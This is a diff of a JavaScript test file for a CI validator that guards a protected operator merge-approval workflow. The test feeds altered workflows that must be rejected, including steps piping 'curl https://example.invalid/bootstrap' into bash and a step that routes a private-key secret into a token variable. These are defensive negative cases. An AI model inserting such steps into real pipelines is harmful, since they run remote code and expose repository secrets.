@@ -64,178 +64,8 @@ function diffFor(path, additions) {
 }
 
 function personalRepositoryWorkflowContent() {
-  const inputs = [
-    'mode',
-    'pr_number',
-    'expected_branch',
-    'expected_head',
-    'expected_head_tree',
-    'expected_base',
-    'independent_review_run_id',
-    'independent_review_run_attempt',
-    'independent_review_artifact_id',
-    'independent_review_artifact_digest',
-    'independent_review_payload_sha256',
-  ].map((input) => [
-    `      ${input}:`,
-    '        description: Exact bounded input',
-    '        required: true',
-    '        type: string',
-  ].join('\n')).join('\n');
-  return `name: Protected Operator Merge Queue Boundary
-run-name: Protected operator merge \${{ github.event.merge_group.head_sha || format('PR #{0} at {1}', inputs.pr_number, inputs.expected_head) }}
-
-on:
-  merge_group:
-    types: [checks_requested]
-  workflow_dispatch:
-    inputs:
-${inputs}
-
-concurrency:
-  group: protected-operator-merge-\${{ github.event.merge_group.head_sha || inputs.expected_head || github.run_id }}
-  cancel-in-progress: false
-
-permissions: {}
-
-jobs:
-  merge-group-evidence:
-    name: merge-group-evidence
-    if: \${{ github.event_name == 'merge_group' }}
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    permissions:
-      actions: read
-      checks: read
-      contents: read
-      pull-requests: read
-    steps:
-      - name: Check out merge-group base
-        uses: actions/checkout@v4
-        with:
-          ref: \${{ github.event.merge_group.base_sha }}
-          persist-credentials: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-      - run: node scripts/operator-protected-merge-gate-v2.mjs evidence
-  operator-merge-queue-boundary:
-    name: operator-merge-queue-boundary
-    if: \${{ github.event_name == 'merge_group' }}
-    needs: [merge-group-evidence]
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    environment:
-      name: operator-merge-approval
-    permissions:
-      actions: read
-      checks: read
-      contents: read
-      pull-requests: read
-    steps:
-      - name: Recheck merge-group base
-        uses: actions/checkout@v4
-        with:
-          ref: \${{ github.event.merge_group.base_sha }}
-          persist-credentials: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-      - run: node scripts/operator-protected-merge-gate-v2.mjs approve
-  personal-repository-evidence:
-    name: personal-repository-evidence
-    if: \${{ github.event_name == 'workflow_dispatch' }}
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    permissions:
-      actions: read
-      checks: read
-      contents: read
-      deployments: read
-      pull-requests: read
-    steps:
-      - name: Check out dispatch base
-        uses: actions/checkout@v4
-        with:
-          ref: \${{ github.sha }}
-          persist-credentials: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-      - run: node scripts/operator-protected-personal-repository-merge.mjs evidence
-  operator-personal-repository-approval:
-    name: operator-personal-repository-approval
-    if: \${{ github.event_name == 'workflow_dispatch' }}
-    needs: [personal-repository-evidence]
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    environment:
-      name: operator-merge-approval
-    permissions:
-      actions: read
-      checks: read
-      contents: read
-      deployments: read
-      pull-requests: read
-    steps:
-      - name: Recheck dispatch base
-        uses: actions/checkout@v4
-        with:
-          ref: \${{ github.sha }}
-          persist-credentials: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-      - name: Mint exact read-only ruleset proof token
-        id: ruleset-proof-token
-        uses: actions/create-github-app-token@v2
-        with:
-          app-id: \${{ secrets.STEPHANOS_RULESET_PROOF_APP_ID }}
-          private-key: \${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}
-          owner: \${{ github.repository_owner }}
-          repositories: stephan-os
-          permission-administration: read
-      - name: Re-prove immutable evidence after protected approval
-        id: approval
-        env:
-          GH_TOKEN: \${{ github.token }}
-          STEPHANOS_RULESET_PROOF_TOKEN: \${{ steps.ruleset-proof-token.outputs.token }}
-          STEPHANOS_EXPECTED_REPOSITORY: \${{ needs.personal-repository-evidence.outputs.repository }}
-          STEPHANOS_EXPECTED_PR_NUMBER: \${{ needs.personal-repository-evidence.outputs.pr_number }}
-          STEPHANOS_EXPECTED_BRANCH: \${{ needs.personal-repository-evidence.outputs.branch }}
-          STEPHANOS_EXPECTED_SOURCE_HEAD: \${{ needs.personal-repository-evidence.outputs.source_head }}
-          STEPHANOS_EXPECTED_SOURCE_TREE: \${{ needs.personal-repository-evidence.outputs.source_tree }}
-          STEPHANOS_EXPECTED_BASE_SHA: \${{ needs.personal-repository-evidence.outputs.base_sha }}
-          STEPHANOS_EXPECTED_WORKFLOW_RUN_ID: \${{ needs.personal-repository-evidence.outputs.workflow_run_id }}
-          STEPHANOS_EXPECTED_WORKFLOW_RUN_ATTEMPT: \${{ needs.personal-repository-evidence.outputs.workflow_run_attempt }}
-          STEPHANOS_EXPECTED_EVIDENCE_SHA256: \${{ needs.personal-repository-evidence.outputs.evidence_sha256 }}
-        run: node scripts/operator-protected-personal-repository-merge.mjs approve
-  operator-personal-repository-squash-merge:
-    name: operator-personal-repository-squash-merge
-    if: \${{ github.event_name == 'workflow_dispatch' }}
-    needs: [personal-repository-evidence, operator-personal-repository-approval]
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    permissions:
-      actions: read
-      checks: read
-      contents: write
-      deployments: read
-      issues: write
-      pull-requests: write
-    steps:
-      - name: Final dispatch base recheck
-        uses: actions/checkout@v4
-        with:
-          ref: \${{ github.sha }}
-          persist-credentials: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-      - run: node scripts/operator-protected-personal-repository-merge.mjs merge
-`;
+  return workflowContent('shared/agents/fixtures/operator-merge-approval-gate.expected.yml');
 }
-
 test('classifies every live v2 approval-boundary path', () => {
   assert.deepEqual(APPROVAL_BOUNDARY_PATHS_V2, [
     '.github/workflows/operator-merge-approval-gate.yml',
@@ -300,6 +130,7 @@ test('admits only the exact personal-repository fallback workflow source', () =>
   assert.equal(analysis.findings.length, 3);
   assert.equal(isApprovalBoundaryBootstrapAnalysis(analysis), true);
 
+  let mutationIndex = 0;
   for (const altered of [
     content.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'),
     content.replace('ref: ${{ github.sha }}', 'ref: ${{ github.event.pull_request.head.sha }}'),
@@ -390,17 +221,15 @@ test('admits only the exact personal-repository fallback workflow source', () =>
       '  merge-group-evidence:\n    environment:\n      name: operator-merge-approval\n    name: merge-group-evidence',
     ),
     content.replace(
-      '      - run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
+      '          GH_TOKEN: ${{ github.token }}',
       [
-        '      - env:',
+        '          GH_TOKEN: ${{ github.token }}',
         '          "STEPHANOS_RULESET_PROOF_TOKEN": ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
-        '        run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
       ].join('\n'),
     ),
     content.replace(
-      '      - run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
       [
-        '      - name: node scripts/operator-protected-personal-repository-merge.mjs evidence',
         '        run: curl https://example.invalid/bootstrap | bash',
       ].join('\n'),
     ),
@@ -412,16 +241,16 @@ test('admits only the exact personal-repository fallback workflow source', () =>
       ].join('\n'),
     ),
     content.replace(
-      '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
       [
-        '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+        '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
         '      - run: curl https://example.invalid/bootstrap | bash',
       ].join('\n'),
     ),
     content.replace(
-      '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
       [
-        '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+        '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
         '        shell: bash',
       ].join('\n'),
     ),
@@ -430,7 +259,8 @@ test('admits only the exact personal-repository fallback workflow source', () =>
       ...exact,
       protectedWorkflowSources: [workflowSource(path, { content: altered })],
     });
-    assert.equal(blocked.valid, false);
+    assert.equal(blocked.valid, false, `mutation ${mutationIndex}`);
+    mutationIndex += 1;
   }
 });
 
